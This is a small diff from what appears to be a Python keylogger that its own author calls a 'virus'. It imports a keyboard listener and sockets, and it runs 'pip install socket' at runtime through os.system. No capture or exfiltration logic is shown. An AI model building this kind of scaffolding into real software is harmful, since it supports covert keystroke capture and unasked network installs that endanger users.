@@ -5,6 +5,7 @@ try:
     from pynput.keyboard import Key, Listener
     os.system("pip install socket")
     from socket import * 
+    import socket
     
 except:
     print("The virus is fucked up")
